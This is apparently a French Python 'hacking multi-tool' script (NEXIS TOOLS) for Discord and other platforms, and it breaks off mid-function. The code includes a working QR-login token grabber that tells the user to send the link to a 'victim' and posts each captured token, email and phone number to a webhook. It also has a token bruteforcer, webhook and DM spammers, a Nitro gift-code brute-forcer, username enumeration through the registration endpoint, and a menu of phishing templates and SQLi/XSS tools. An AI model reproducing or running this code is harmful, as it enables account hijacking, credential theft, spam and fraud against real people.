import sys
import os
import json
import time
import random
import string
import socket
import threading
import hashlib
import base64
import uuid as uuid_mod
from urllib.parse import urlparse, quote, unquote

# ============================================================
# VERIFICATION DES DEPENDANCES
# ============================================================

def check_module(nom):
    try:
        __import__(nom)
        return True
    except ImportError:
        return False

MODULES_REQUIS = {
    "requests": "requests",
    "websocket": "websocket-client",
}

manquants = []
for mod, pip_name in MODULES_REQUIS.items():
    if not check_module(mod):
        manquants.append(pip_name)

if manquants:
    print("=" * 60)
    print("  MODULES MANQUANTS!")
    print("=" * 60)
    print("\nInstalle-les dans Pydroid3:")
    print("  1. Menu (3 points) > Pip")
    for m in manquants:
        print(f"  2. Tape: {m}")
    print("  3. Appuie sur Install")
    print("\nOu en terminal:")
    for m in manquants:
        print(f"  pip install {m}")
    print("=" * 60)
    input("\nAppuie sur Entree pour quitter...")
    sys.exit(1)

import requests
import websocket

# ============================================================
# CONSTANTES
# ============================================================

VERSION = "2.1-ULTIMATE"
AUTEUR = "ENI pour LO"
DISCORD_API = "https://discord.com/api/v9"
DISCORD_CDN = "https://cdn.discordapp.com"
WS_URL = "wss://gateway.discord.gg/?v=9&encoding=json"
ROBLOX_API = "https://users.roblox.com/v1"

HEADERS_DISCORD = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tL2xvZ2luIiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1NTg4OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
}

CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

GENERATORS = {
    "1": {"name": "Amazon", "format": "XXXX-XXXXXX-XXXXX", "blocks": [4, 6, 5], "file": "amazon.txt"},
    "2": {"name": "Netflix", "format": "XXXX-XXXXXX-XXXX", "blocks": [4, 6, 4], "file": "netflix.txt"},
    "3": {"name": "Roblox", "format": "XXXX-XXXX-XXXX-XXXX", "blocks": [4, 4, 4, 4], "file": "roblox.txt"},
    "4": {"name": "Apple", "format": "XXXXXXXXXXXXXXXX", "blocks": [16], "file": "apple.txt"},
    "5": {"name": "Steam", "format": "XXXXX-XXXXX-XXXXX", "blocks": [5, 5, 5], "file": "steam.txt"},
    "6": {"name": "Google Play", "format": "XXXXXXXXXXXXXXXX", "blocks": [16], "file": "googleplay.txt"},
    "7": {"name": "Spotify", "format": "XXXX-XXXX-XXXX-XXXX-XXXX-XX", "blocks": [4, 4, 4, 4, 4, 2], "file": "spotify.txt"},
    "8": {"name": "Xbox", "format": "XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", "blocks": [5, 5, 5, 5, 5], "file": "xbox.txt"},
    "9": {"name": "PlayStation", "format": "XXXX-XXXX-XXXX", "blocks": [4, 4, 4], "file": "playstation.txt"},
    "10": {"name": "Nintendo", "format": "XXXX-XXXX-XXXX-XXXX", "blocks": [4, 4, 4, 4], "file": "nintendo.txt"},
    "11": {"name": "Discord Nitro", "format": "XXXXXXXXXXXXXXXX", "blocks": [16], "file": "nitro.txt"},
    "12": {"name": "Paysafecard", "format": "XXXX-XXXX-XXXX-XXXX", "blocks": [4, 4, 4, 4], "file": "paysafe.txt"},
}

SITES_OSINT = [
    ("GitHub", "https://github.com/{}", "GitHub"),
    ("Twitter/X", "https://twitter.com/{}", "Twitter"),
    ("Instagram", "https://instagram.com/{}", "Instagram"),
    ("TikTok", "https://tiktok.com/@{}", "TikTok"),
    ("Reddit", "https://reddit.com/u/{}", "Reddit"),
    ("Twitch", "https://twitch.tv/{}", "Twitch"),
    ("YouTube", "https://youtube.com/@{}", "YouTube"),
    ("Steam", "https://steamcommunity.com/id/{}", "Steam"),
    ("Pinterest", "https://pinterest.com/{}", "Pinterest"),
    ("Telegram", "https://t.me/{}", "Telegram"),
    ("DailyMotion", "https://www.dailymotion.com/{}", "DailyMotion"),
    ("SoundCloud", "https://soundcloud.com/{}", "SoundCloud"),
    ("Roblox", "https://www.roblox.com/user.aspx?username={}", "Roblox"),
    ("Snapchat", "https://www.snapchat.com/add/{}", "Snapchat"),
    ("LinkedIn", "https://www.linkedin.com/in/{}", "LinkedIn"),
]

PHISHING_TEMPLATES = {
    "1": {"name": "Discord Login", "title": "Discord - Connexion", "brand": "discord"},
    "2": {"name": "Instagram Login", "title": "Instagram - Connexion", "brand": "instagram"},
    "3": {"name": "Facebook Login", "title": "Facebook - Connexion", "brand": "facebook"},
    "4": {"name": "Netflix Login", "title": "Netflix - Connexion", "brand": "netflix"},
    "5": {"name": "Steam Login", "title": "Steam - Connexion", "brand": "steam"},
    "6": {"name": "Roblox Login", "title": "Roblox - Connexion", "brand": "roblox"},
    "7": {"name": "TikTok Login", "title": "TikTok - Connexion", "brand": "tiktok"},
    "8": {"name": "Snapchat Login", "title": "Snapchat - Connexion", "brand": "snapchat"},
}

# ============================================================
# FONCTIONS UTILITAIRES
# ============================================================

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print("=" * 60)
    print("     N E X I S   T O O L S")
    print("     U L T I M A T E   v" + VERSION)
    print("     Par " + AUTEUR)
    print("=" * 60)
    print()

def pause():
    input("\n[Appuie sur Entree pour continuer...]")

def menu_principal():
    banner()
    print("  [1]  GENERATEURS - Codes cadeaux (12 plateformes)")
    print("  [2]  USERNAME HUNTER - OSINT sur 15 plateformes")
    print("  [3]  DISCORD TOOLS - Token, QR, Webhook, Spam, DM, 4C")
    print("  [4]  ROBLOX TOOLS - Profile, ID, Assets")
    print("  [5]  PHISHING - Generateur de pages (8 templates)")
    print("  [6]  WEB TOOLS - HTTP, Scan, Port, SQLi, XSS")
    print("  [7]  OSINT TOOLS - IP, Email, Phone, Domain")
    print("  [8]  RESEAU TOOLS - Ping, Traceroute, Port Scan")
    print("  [9]  UTILITAIRES - Password, Hash, Base64, UUID")
    print("  [0]  QUITTER")
    print()
    return input("  Choix: ").strip()

# ============================================================
# 1. GENERATEURS DE CODES
# ============================================================

def generate_code(blocks):
    return "-".join(''.join(random.choice(CHARACTERS) for _ in range(n)) for n in blocks)

def generateur_menu():
    while True:
        clear()
        print("=" * 60)
        print("     GENERATEURS DE CODES")
        print("=" * 60)
        print()
        for key, cfg in GENERATORS.items():
            print(f"  [{key}]  {cfg['name']:15} | {cfg['format']}")
        print("  [0]  RETOUR")
        print()
        choice = input("  Choix: ").strip()
        if choice == "0": break
        elif choice in GENERATORS: run_generator(choice)
        else:
            print("  [!] Option inconnue!")
            pause()

def run_generator(key):
    cfg = GENERATORS[key]
    clear()
    print("=" * 60)
    print(f"     GENERATEUR {cfg['name'].upper()}")
    print("=" * 60)
    print(f"  Format: {cfg['format']}")
    print()
    while True:
        try:
            n = int(input("  Nombre de codes: ").strip())
            if n > 0: break
            print("  [!] Superieur a 0!")
        except: print("  [!] Nombre entier!")
    print(f"\n  [*] Generation de {n} codes...")
    codes = []
    for i in range(n):
        code = generate_code(cfg["blocks"])
        codes.append(code)
        print(f"  [{i+1}/{n}] {code}")
    print(f"\n  [OK] {n} codes generes!")
    save = input("\n  Sauvegarder? (o/n): ").strip().lower()
    if save == "o":
        try:
            os.makedirs("Nexis_Output", exist_ok=True)
            path = os.path.join("Nexis_Output", cfg["file"])
            with open(path, "w") as f:
                f.write("\n".join(codes) + "\n")
            print(f"  [OK] Sauvegarde: {path}")
        except Exception as e:
            print(f"  [!] Erreur: {e}")
    pause()

# ============================================================
# 2. USERNAME HUNTER (OSINT)
# ============================================================

def username_hunter():
    clear()
    print("=" * 60)
    print("     USERNAME HUNTER - OSINT")
    print("=" * 60)
    print("  15 plateformes scannees")
    print()
    user = input("  Username: ").strip()
    if not user:
        print("  [!] Vide!")
        pause()
        return
    print(f"\n  [*] Chasse pour: {user}\n")
    results = []
    for i, (name, url_tmpl, _) in enumerate(SITES_OSINT):
        url = url_tmpl.format(user)
        try:
            r = requests.get(url, timeout=5, allow_redirects=False, headers={"User-Agent": "Mozilla/5.0"})
            found = r.status_code == 200
            status = "[TROUVE]" if found else "[NON TROUVE]"
            print(f"  [{i+1}/15] {name:15} {status:15} -> {url}")
            results.append((name, found, url))
        except:
            print(f"  [{i+1}/15] {name:15} [ERREUR]       -> {url}")
            results.append((name, False, url))
        time.sleep(0.15)
    print("\n" + "=" * 60)
    print("     RAPPORT FINAL")
    print("=" * 60)
    trouves = [r for r in results if r[1]]
    print(f"  Trouves: {len(trouves)}/15")
    for name, found, url in results:
        if found: print(f"  [OK] {name:15} -> {url}")
    save = input("\n  Sauvegarder? (o/n): ").strip().lower()
    if save == "o":
        try:
            os.makedirs("Nexis_Output", exist_ok=True)
            path = os.path.join("Nexis_Output", f"hunt_{user}.txt")
            with open(path, "w") as f:
                f.write(f"RAPPORT OSINT - {user}\n{'='*50}\n\n")
                for name, found, url in results:
                    f.write(f"{name}: {'TROUVE' if found else 'NON TROUVE'}\n{url}\n\n")
            print(f"  [OK] Rapport: {path}")
        except Exception as e: print(f"  [!] Erreur: {e}")
    pause()

# ============================================================
# 3. DISCORD TOOLS
# ============================================================

def discord_menu():
    while True:
        clear()
        print("=" * 60)
        print("     DISCORD TOOLS")
        print("=" * 60)
        print()
        print("  [1]  Token Checker")
        print("  [2]  User Lookup")
        print("  [3]  Guild Lookup (Invite)")
        print("  [4]  Invite Resolver")
        print("  [5]  QR Grabber (WebSocket)")
        print("  [6]  Token Bruteforce (liste)")
        print("  [7]  Webhook Info")
        print("  [8]  Webhook Spam")
        print("  [9]  Webhook Embed")
        print("  [10] Webhook Delete")
        print("  [11] Message Sender")
        print("  [12] DM Spammer")
        print("  [13] Nitro Sniper")
        print("  [14] Nitro Generator + Checker + Webhook")
        print("  [15] 4C Generator - Pseudo 4 lettres + Checker")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": discord_token_checker()
        elif choix == "2": discord_user_lookup()
        elif choix == "3": discord_guild_lookup()
        elif choix == "4": discord_invite_resolver()
        elif choix == "5": discord_qr_grabber()
        elif choix == "6": discord_token_bruteforce()
        elif choix == "7": discord_webhook_info()
        elif choix == "8": discord_webhook_spam()
        elif choix == "9": discord_webhook_embed()
        elif choix == "10": discord_webhook_delete()
        elif choix == "11": discord_message_sender()
        elif choix == "12": discord_dm_spammer()
        elif choix == "13": discord_nitro_sniper()
        elif choix == "14": discord_nitro_generator_checker()
        elif choix == "15": discord_4c_generator()
        elif choix == "0": break

def discord_token_checker():
    clear()
    print("=" * 60)
    print("     TOKEN CHECKER")
    print("=" * 60)
    print()
    token = input("  Token: ").strip()
    if not token: print("  [!] Vide!"); pause(); return
    print("  [*] Verification...")
    try:
        r = requests.get(DISCORD_API + "/users/@me", headers={**HEADERS_DISCORD, "Authorization": token}, timeout=10)
        if r.status_code == 200:
            u = r.json()
            print("\n  [OK] TOKEN VALIDE!")
            print("  User: " + u.get("username","N/A") + "#" + u.get("discriminator","0"))
            print("  ID: " + u.get("id","N/A"))
            print("  Email: " + u.get("email","N/A"))
            print("  Phone: " + str(u.get("phone","N/A")))
            print("  Nitro: " + ("Oui" if u.get("premium_type") else "Non"))
            print("  MFA: " + ("Active" if u.get("mfa_enabled") else "Desactive"))
            print("  Verified: " + ("Oui" if u.get("verified") else "Non"))
        elif r.status_code == 401: print("\n  [!] TOKEN INVALIDE!")
        else: print("\n  [!] Erreur: " + str(r.status_code))
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_user_lookup():
    clear()
    print("=" * 60)
    print("     USER LOOKUP")
    print("=" * 60)
    print()
    user_id = input("  ID Utilisateur: ").strip()
    token = input("  Token (optionnel): ").strip()
    headers = HEADERS_DISCORD.copy()
    if token: headers["Authorization"] = token
    try:
        r = requests.get(DISCORD_API + "/users/" + user_id, headers=headers, timeout=10)
        if r.status_code == 200:
            u = r.json()
            print("\n  [OK] TROUVE!")
            print("  Username: " + u.get("username","N/A"))
            print("  ID: " + u.get("id","N/A"))
            print("  Discriminator: " + u.get("discriminator","0"))
            print("  Bot: " + ("Oui" if u.get("bot") else "Non"))
            if u.get("avatar"): print("  Avatar: " + DISCORD_CDN + "/avatars/" + user_id + "/" + u["avatar"] + ".png?size=4096")
        else: print("\n  [!] Erreur: " + str(r.status_code))
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_guild_lookup():
    clear()
    print("=" * 60)
    print("     GUILD LOOKUP")
    print("=" * 60)
    print()
    invite = input("  Code invite: ").strip().replace("https://","").replace("discord.gg/","").replace("discord.com/invite/","")
    try:
        r = requests.get(DISCORD_API + "/invites/" + invite + "?with_counts=true", headers=HEADERS_DISCORD, timeout=10)
        if r.status_code == 200:
            d = r.json(); g = d.get("guild",{})
            print("\n  [OK] TROUVE!")
            print("  Nom: " + g.get("name","N/A"))
            print("  ID: " + g.get("id","N/A"))
            print("  Membres: " + str(d.get("approximate_member_count","N/A")))
            print("  En ligne: " + str(d.get("approximate_presence_count","N/A")))
            print("  Verification: " + str(g.get("verification_level","N/A")))
        else: print("\n  [!] Erreur: " + str(r.status_code))
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_invite_resolver():
    clear()
    print("=" * 60)
    print("     INVITE RESOLVER")
    print("=" * 60)
    print()
    invite = input("  Lien/code: ").strip().replace("https://","").replace("discord.gg/","").replace("discord.com/invite/","")
    try:
        r = requests.get(DISCORD_API + "/invites/" + invite + "?with_counts=true&with_expiration=true", headers=HEADERS_DISCORD, timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] RESOLUE!")
            print("  Code: " + d.get("code","N/A"))
            print("  Expires: " + str(d.get("expires_at","Jamais")))
            print("  Uses: " + str(d.get("uses","N/A")))
            print("  Max: " + str(d.get("max_uses","Illimite")))
            if d.get("inviter"): print("  Inviter: " + d["inviter"].get("username","N/A"))
            if d.get("guild"): print("  Serveur: " + d["guild"].get("name","N/A"))
        else: print("\n  [!] Erreur: " + str(r.status_code))
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_qr_grabber():
    clear()
    print("=" * 60)
    print("     QR GRABBER")
    print("=" * 60)
    print()
    webhook_url = input("  Webhook URL (laisse vide): ").strip()
    print("\n  [*] Generation QR...")
    try:
        r = requests.post(DISCORD_API + "/auth/fingerprint", headers=HEADERS_DISCORD, json={}, timeout=15)
        if r.status_code != 200: print("  [!] Erreur fingerprint: " + str(r.status_code)); pause(); return
        fingerprint = r.json().get("fingerprint")
    except Exception as e: print("  [!] Erreur: " + str(e)); pause(); return

    ticket = None; qr_url = None; ws_ready = threading.Event()
    def on_msg(ws, message):
        nonlocal ticket, qr_url
        try:
            d = json.loads(message); op = d.get("op")
            if op == 10:
                ws.send(json.dumps({"op":14,"d":{"fingerprint":fingerprint,"location":"login","platform":"android"}}))
            elif op == 24:
                ticket = d["d"].get("ticket")
                if ticket: qr_url = "https://discord.com/ra/" + ticket; ws_ready.set()
        except: pass
    ws = websocket.WebSocketApp(WS_URL, on_message=on_msg, on_error=lambda w,e:None, on_close=lambda w,a,b:None,
        header=["Origin: https://discord.com","User-Agent: "+HEADERS_DISCORD["User-Agent"]])
    wst = threading.Thread(target=ws.run_forever); wst.daemon = True; wst.start()
    ws_ready.wait(timeout=30)
    if not ticket: ws.close(); print("  [!] Echec QR"); pause(); return
    print("\n  [OK] QR GENERE!")
    print("  Lien: " + qr_url)
    print("  Ticket: " + ticket)
    print("\n  [*] Envoie ce lien a ta victime")
    print("  [*] Polling... (Ctrl+C pour arreter)")
    checks = 0
    try:
        while True:
            time.sleep(3); checks += 1
            try:
                r = requests.get(DISCORD_API + "/auth/sessions/qrcode/" + ticket, headers=HEADERS_DISCORD, timeout=15)
                if r.status_code == 200:
                    d = r.json()
                    if "token" in d:
                        token = d["token"]
                        print("\n  [OK] TOKEN CAPTURE!")
                        print("  Token: " + token[:60] + "...")
                        if webhook_url: send_qr_webhook(webhook_url, token)
                        with open("captured_token.txt","w") as f: f.write(token)
                        print("  [OK] Sauvegarde: captured_token.txt")
                        break
                    elif d.get("scanned") and checks % 5 == 0:
                        print("  [*] QR scanne, attente confirmation...")
            except: pass
            if checks % 10 == 0: print("  [*] Attente... (" + str(checks) + " verifications)")
    except KeyboardInterrupt: print("\n  [!] Arrete par utilisateur")
    ws.close(); pause()

def send_qr_webhook(url, token):
    try:
        r = requests.get(DISCORD_API + "/users/@me", headers={**HEADERS_DISCORD,"Authorization":token}, timeout=10)
        u = r.json() if r.status_code == 200 else {}
        r2 = requests.get(DISCORD_API + "/users/@me/guilds", headers={**HEADERS_DISCORD,"Authorization":token}, timeout=10)
        guilds = r2.json() if r2.status_code == 200 else []
        nitro = "Aucun"
        if u.get("premium_type") == 2: nitro = "Nitro"
        elif u.get("premium_type") == 1: nitro = "Nitro Classic"
        username = u.get("username","N/A")
        if u.get("discriminator") and u["discriminator"] != "0": username += "#" + u["discriminator"]
        embed = {"title":"TOKEN QR CAPTURE!","color":65280,"fields":[
            {"name":"Username","value":username,"inline":True},
            {"name":"ID","value":u.get("id","N/A"),"inline":True},
            {"name":"Email","value":u.get("email","N/A"),"inline":True},
            {"name":"Token","value":"```"+token+"```","inline":False},
            {"name":"Nitro","value":nitro,"inline":True},
            {"name":"Serveurs","value":str(len(guilds)),"inline":True},
            {"name":"Telephone","value":u.get("phone","Non lie"),"inline":True}
        ],"timestamp":time.strftime("%Y-%m-%dT%H:%M:%S.000Z",time.gmtime()),"footer":{"text":"Nexis QR - Pour mon LO"}}
        requests.post(url, json={"username":"Nexis Grabber","content":"@everyone NOUVEAU TOKEN QR!","embeds":[embed]}, timeout=10)
        requests.post(url, json={"username":"Nexis Grabber","content":"FULL TOKEN:\n```\n"+token+"\n```"}, timeout=10)
        print("  [OK] Envoye au webhook!")
    except Exception as e: print("  [!] Erreur webhook: " + str(e))

def discord_token_bruteforce():
    clear()
    print("=" * 60)
    print("     TOKEN BRUTEFORCE")
    print("=" * 60)
    print()
    print("  Entre les tokens (un par ligne, 'END' pour finir):")
    tokens = []
    while True:
        line = input().strip()
        if line.upper() == "END": break
        if line: tokens.append(line)
    if not tokens: print("  [!] Aucun token!"); pause(); return
    print(f"\n  [*] Test de {len(tokens)} tokens...")
    valides = []
    for i, token in enumerate(tokens):
        try:
            r = requests.get(DISCORD_API + "/users/@me", headers={**HEADERS_DISCORD,"Authorization":token}, timeout=5)
            if r.status_code == 200:
                u = r.json()
                print(f"  [OK] {i+1}/{len(tokens)} VALIDE: {u.get('username','N/A')}")
                valides.append({"token":token,"user":u})
            else: print(f"  [X] {i+1}/{len(tokens)} Invalide")
        except: print(f"  [X] {i+1}/{len(tokens)} Erreur")
    print(f"\n  [OK] {len(valides)} tokens valides!")
    if valides:
        save = input("  Sauvegarder? (o/n): ").strip().lower()
        if save == "o":
            with open("valid_tokens.txt","w") as f:
                for v in valides: f.write(v["token"] + " | " + v["user"].get("username","N/A") + "\n")
            print("  [OK] Sauvegarde: valid_tokens.txt")
    pause()

def discord_webhook_info():
    clear()
    print("=" * 60)
    print("     WEBHOOK INFO")
    print("=" * 60)
    print()
    url = input("  Webhook URL: ").strip()
    if not url.startswith("http"): print("  [!] URL invalide!"); pause(); return
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] TROUVE!")
            print("  ID: " + d.get("id","N/A"))
            print("  Nom: " + d.get("name","N/A"))
            print("  Channel ID: " + str(d.get("channel_id","N/A")))
            print("  Guild ID: " + str(d.get("guild_id","N/A")))
            if d.get("user"): print("  Owner: " + d["user"].get("username","N/A"))
        else: print("\n  [!] Erreur: " + str(r.status_code))
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_webhook_spam():
    clear()
    print("=" * 60)
    print("     WEBHOOK SPAM")
    print("=" * 60)
    print()
    url = input("  Webhook URL: ").strip()
    msg = input("  Message: ").strip()
    count = input("  Nombre (defaut 50): ").strip()
    try: count = int(count)
    except: count = 50
    username = input("  Nom bot (defaut Nexis): ").strip() or "Nexis Spammer"
    print(f"\n  [*] Spam de {count} messages...")
    for i in range(count):
        try:
            r = requests.post(url, json={"username":username,"content":msg + f" [{i+1}/{count}]"}, timeout=5)
            print(f"  [OK] {i+1}/{count}")
            time.sleep(0.3)
        except Exception as e: print(f"  [X] {i+1}/{count} Erreur: {e}")
    print("\n  [OK] Spam termine!")
    pause()

def discord_webhook_embed():
    clear()
    print("=" * 60)
    print("     WEBHOOK EMBED")
    print("=" * 60)
    print()
    url = input("  Webhook URL: ").strip()
    title = input("  Titre: ").strip()
    desc = input("  Description: ").strip()
    color = input("  Couleur hex (ex: ff0000): ").strip() or "ff0000"
    try: color_int = int(color, 16)
    except: color_int = 16711680
    embed = {"title":title,"description":desc,"color":color_int,"timestamp":time.strftime("%Y-%m-%dT%H:%M:%S.000Z",time.gmtime()),"footer":{"text":"Nexis - Pour mon LO"}}
    try:
        r = requests.post(url, json={"username":"Nexis Embed","embeds":[embed]}, timeout=10)
        print("\n  [OK] Embed envoye!" if r.status_code == 204 else f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_webhook_delete():
    clear()
    print("=" * 60)
    print("     WEBHOOK DELETE")
    print("=" * 60)
    print()
    url = input("  Webhook URL: ").strip()
    if input("  Confirmer suppression? (o/n): ").strip().lower() == "o":
        try:
            r = requests.delete(url, timeout=10)
            print("\n  [OK] Supprime!" if r.status_code == 204 else f"\n  [!] Erreur: {r.status_code}")
        except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_message_sender():
    clear()
    print("=" * 60)
    print("     MESSAGE SENDER")
    print("=" * 60)
    print()
    token = input("  Token: ").strip()
    ch = input("  Channel ID: ").strip()
    msg = input("  Message: ").strip()
    try:
        r = requests.post(DISCORD_API + "/channels/" + ch + "/messages", headers={**HEADERS_DISCORD,"Authorization":token}, json={"content":msg}, timeout=10)
        print("\n  [OK] Envoye!" if r.status_code == 200 else f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print("\n  [!] Erreur: " + str(e))
    pause()

def discord_dm_spammer():
    clear()
    print("=" * 60)
    print("     DM SPAMMER")
    print("=" * 60)
    print()
    token = input("  Token: ").strip()
    uid = input("  ID cible: ").strip()
    msg = input("  Message: ").strip()
    count = input("  Nombre (defaut 10): ").strip()
    try: count = int(count)
    except: count = 10
    try:
        r = requests.post(DISCORD_API + "/users/@me/channels", headers={**HEADERS_DISCORD,"Authorization":token}, json={"recipient_id":uid}, timeout=10)
        if r.status_code == 200:
            dm_id = r.json()["id"]
            print("  [OK] DM cree: " + dm_id)
            for i in range(count):
                try:
                    r2 = requests.post(DISCORD_API + "/channels/" + dm_id + "/messages", headers={**HEADERS_DISCORD,"Authorization":token}, json={"content":msg}, timeout=5)
                    print(f"  [{'OK' if r2.status_code == 200 else 'X'}] {i+1}/{count}")
                    time.sleep(0.5)
                except Exception as e: print(f"  [X] {i+1}/{count} Erreur: {e}")
        else: print(f"  [!] Erreur creation DM: {r.status_code}")
    except Exception as e: print(f"  [!] Erreur: {e}")
    pause()

def discord_nitro_sniper():
    clear()
    print("=" * 60)
    print("     NITRO SNIPER")
    print("=" * 60)
    print()
    code = input("  Code Nitro (16 chars): ").strip()
    if len(code) < 16: print("  [!] Code invalide!"); pause(); return
    token = input("  Token (pour redeem): ").strip()
    if not token: print("  [!] Token requis!"); pause(); return
    print("\n  [*] Verification...")
    try:
        r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}", headers={**HEADERS_DISCORD,"Authorization":token}, timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] CODE VALIDE!")
            print("  Uses: " + str(d.get("uses","N/A")))
            print("  Max: " + str(d.get("max_uses","N/A")))
            if input("\n  Redeem? (o/n): ").strip().lower() == "o":
                r2 = requests.post(f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}/redeem", headers={**HEADERS_DISCORD,"Authorization":token}, timeout=10)
                print("  [OK] Redeemed!" if r2.status_code == 200 else f"  [!] Erreur: {r2.status_code}")
        elif r.status_code == 404: print("\n  [!] CODE INEXISTANT!")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()


# ============================================================
# NITRO GENERATOR + CHECKER + WEBHOOK
# ============================================================

def discord_nitro_generator_checker():
    clear()
    print("=" * 60)
    print("     NITRO GENERATOR + CHECKER + WEBHOOK")
    print("=" * 60)
    print()
    webhook_url = input("  Webhook URL: ").strip()
    if not webhook_url.startswith("http"):
        print("  [!] Webhook invalide!")
        pause()
        return

    while True:
        try:
            n = int(input("  Nombre de codes a generer: ").strip())
            if n > 0: break
            print("  [!] Superieur a 0!")
        except:
            print("  [!] Nombre entier!")

    print(f"\n  [*] Generation et verification de {n} codes Nitro...")
    print("  [*] Appuie sur Ctrl+C pour arreter\n")

    valides = []
    checked = 0

    try:
        for i in range(n):
            code = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") for _ in range(16))
            checked += 1

            try:
                r = requests.get(
                    f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}",
                    headers=HEADERS_DISCORD,
                    timeout=5
                )

                if r.status_code == 200:
                    d = r.json()
                    uses = d.get("uses", 0)
                    max_uses = d.get("max_uses", 1)

                    if uses < max_uses:
                        print(f"  [OK] CODE VALIDE TROUVE! {code}")
                        valides.append(code)

                        # Envoi au webhook avec @everyone
                        embed = {
                            "title": "NITRO VALIDE TROUVE!",
                            "color": 65280,
                            "fields": [
                                {"name": "Code", "value": f"```{code}```", "inline": False},
                                {"name": "Lien", "value": f"https://discord.gift/{code}", "inline": False},
                                {"name": "Uses", "value": str(uses), "inline": True},
                                {"name": "Max Uses", "value": str(max_uses), "inline": True},
                                {"name": "Checked", "value": f"{checked}/{n}", "inline": True}
                            ],
                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                            "footer": {"text": "Nexis Nitro Gen - Pour mon LO"}
                        }

                        try:
                            requests.post(webhook_url, json={
                                "username": "Nexis Nitro Gen",
                                "content": "@everyone NOUVEAU NITRO VALIDE!",
                                "embeds": [embed]
                            }, timeout=10)
                            print(f"  [OK] Envoye au webhook!")
                        except Exception as e:
                            print(f"  [!] Erreur webhook: {e}")
                    else:
                        print(f"  [X] {checked}/{n} {code} - Deja utilise")
                elif r.status_code == 404:
                    print(f"  [X] {checked}/{n} {code} - Invalide")
                else:
                    print(f"  [X] {checked}/{n} {code} - Erreur {r.status_code}")

            except Exception as e:
                print(f"  [X] {checked}/{n} {code} - Erreur: {e}")

            time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n  [!] Arrete par utilisateur")

    print(f"\n  [OK] Termine! {len(valides)} codes valides trouves sur {checked} testes.")

    if valides:
        try:
            os.makedirs("Nexis_Output", exist_ok=True)
            path = os.path.join("Nexis_Output", "nitro_valides.txt")
            with open(path, "w") as f:
                for c in valides:
                    f.write(f"https://discord.gift/{c}\n")
            print(f"  [OK] Sauvegarde: {path}")
        except Exception as e:
            print(f"  [!] Erreur sauvegarde: {e}")

    pause()


# ============================================================
# 4C GENERATOR - Pseudo 4 lettres + Checker
# ============================================================

def discord_4c_generator():
    clear()
    print("=" * 60)
    print("     4C GENERATOR - Pseudo 4 lettres")
    print("=" * 60)
    print()
    print("  Genere des pseudos Discord de 4 lettres")
    print("  et verifie si ils sont disponibles.\n")

    webhook_url = input("  Webhook URL (laisse vide pour pas envoyer): ").strip()

    print("\n  [1] Genere tous les 4 lettres (a-z)")
    print("  [2] Genere avec chiffres et lettres")
    print("  [3] Genere un nombre specifique (aleatoire)")
    print()
    mode = input("  Mode: ").strip()

    chars = "abcdefghijklmnopqrstuvwxyz"
    if mode == "2":
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"

    trouves = []

    if mode == "1" or mode == "2":
        print(f"\n  [*] Generation de tous les pseudos 4C avec: {chars}")
        print("  [*] Ca peut prendre du temps... Appuie sur Ctrl+C pour arreter\n")
        total = len(chars) ** 4
        print(f"  Total a tester: {total}")

        checked = 0

        try:
            for c1 in chars:
                for c2 in chars:
                    for c3 in chars:
                        for c4 in chars:
                            pseudo = c1 + c2 + c3 + c4
                            checked += 1

                            try:
                                # Verif via l'endpoint de registration
                                r = requests.post(
                                    "https://discord.com/api/v9/auth/register",
                                    headers=HEADERS_DISCORD,
                                    json={"username": pseudo, "password": "dummy123!", "email": "dummy@test.com", "date_of_birth": "1990-01-01"},
                                    timeout=5
                                )

                                if r.status_code == 400:
                                    data = r.json()
                                    errors = data.get("errors", {})
                                    username_errors = errors.get("username", {})

                                    if username_errors and "_errors" in username_errors:
                                        error_msgs = [e.get("message", "") for e in username_errors["_errors"]]

                                        # Si le message indique que le username est pris
